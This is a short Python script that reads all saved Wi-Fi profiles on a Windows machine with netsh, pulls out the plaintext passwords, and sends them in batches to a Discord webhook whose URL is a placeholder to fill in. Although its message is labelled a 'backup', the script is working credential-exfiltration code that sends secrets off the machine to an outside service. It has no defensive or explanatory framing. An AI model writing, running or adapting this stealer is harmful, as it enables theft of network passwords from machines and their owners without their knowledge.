import subprocess
import requests
import json
import time

def get_wifi_passwords():
    """Fetch Wi-Fi SSIDs and their passwords."""
    wifi_info = []
    
    print("[*] Gathering Wi-Fi profiles...")

    # Get the list of Wi-Fi profiles
    profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8')
    
    # Extract profile names
    profiles = [line.split(":")[1][1:-1] for line in profiles_output.split('\n') if "All User Profile" in line]

    if not profiles:
        print("[!] No Wi-Fi profiles found.")
        return []

    print(f"[*] Found {len(profiles)} Wi-Fi profiles. Retrieving passwords...")

    # Get the password for each profile
    for profile in profiles:
        try:
            # Get the password for each profile
            result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8')
            password_line = [line for line in result.split('\n') if "Key Content" in line]
            password = password_line[0].split(":")[1][1:] if password_line else None

            if password:
                wifi_info.append({"SSID": profile, "Password": password})
                print(f"[+] {profile}: {password}")  # Show each successful entry
            
        except Exception as e:
            print(f"[!] Error retrieving password for {profile}: {e}")

    print(f"[*] Successfully retrieved {len(wifi_info)} Wi-Fi passwords.")
    return wifi_info

def send_to_discord(webhook_url, wifi_info):
    """Send Wi-Fi passwords to Discord webhook in embeds."""
    embed_limit_count = 20  # Maximum number of records in one embed
    embed_color = 3447003  # Optional: set a color for the embed

    if not wifi_info:
        print("[!] No Wi-Fi passwords to send.")
        return

    print(f"[*] Sending {len(wifi_info)} Wi-Fi passwords to Discord...")

    for i in range(0, len(wifi_info), embed_limit_count):
        embed_chunk = []

        # Create an embed for the current batch
        embed = {
            "title": "📡 Wi-Fi Passwords Backup",
            "description": "Here are the stored Wi-Fi passwords:",
            "color": embed_color,
            "fields": []
        }

        # Collect up to 20 records for the embed
        for j in range(i, min(i + embed_limit_count, len(wifi_info))):
            record = wifi_info[j]
            embed["fields"].append({
                "name": f"**{record['SSID']}**",  # SSID in bold
                "value": f"{record['Password']}",  # Password in normal text
                "inline": True  # Show entries in a single line for compactness
            })

        # Send the embed to Discord
        data = {
            "embeds": [embed]
        }
        response = requests.post(webhook_url, json=data)
        print(f"[*] Sent {len(embed['fields'])} records. Webhook response: {response.status_code}")

        # Delay to avoid hitting rate limits (adjust if necessary)
        time.sleep(2)

    print("[✔] Wi-Fi passwords successfully sent to Discord.")

if __name__ == "__main__":
    # Set your Discord webhook URL here
    DISCORD_WEBHOOK_URL = "WEBHOOKHERE"

    wifi_passwords = get_wifi_passwords()
    
    if wifi_passwords:
        send_to_discord(DISCORD_WEBHOOK_URL, wifi_passwords)
    else:
        print("[!] No Wi-Fi passwords found.")
